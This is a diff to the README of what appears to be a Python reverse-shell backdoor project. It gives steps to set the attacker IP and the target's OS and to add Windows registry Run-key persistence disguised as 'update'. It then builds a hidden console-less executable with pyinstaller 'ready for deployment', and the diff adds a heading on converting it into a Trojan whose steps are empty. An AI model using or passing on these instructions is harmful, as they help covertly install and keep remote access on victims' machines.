@@ -6,6 +6,7 @@ A reverse shell written in Python with Single client support
 The backdoor.py script is the backdoor. It can be used as it is, or can be converted to an executable using ```Pyinstaller```
 
 Step 1 
+
 Editing backdoor.py and listener.py
 ```
 # These stataments are at the very ends of the files
@@ -29,6 +30,8 @@ def persistence(self):
             subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ/d "' + location + '"', shell=True)
             # command for persistence windows. Modify for linux and MacOS
 ```
+Step 2
+
 Once the files have been edited for your machine's IP and target's OS, it can be converted to a executable using pyinstaller, or can be used as it is
 ```
 pip3 install pyinstaller
@@ -38,6 +41,19 @@ pyinstaller --onefile --noconsole backdoor.py
 The executable will be found in the dist folder
 
 Now, the executable is ready for deployment.
+
+## To convert executable to Trojan
+
+Step 1
+
+Edit backdoor.py
+```
+```
+step 2
+
+Use pyinstaller
+```
+```
 
 ## Usage
 
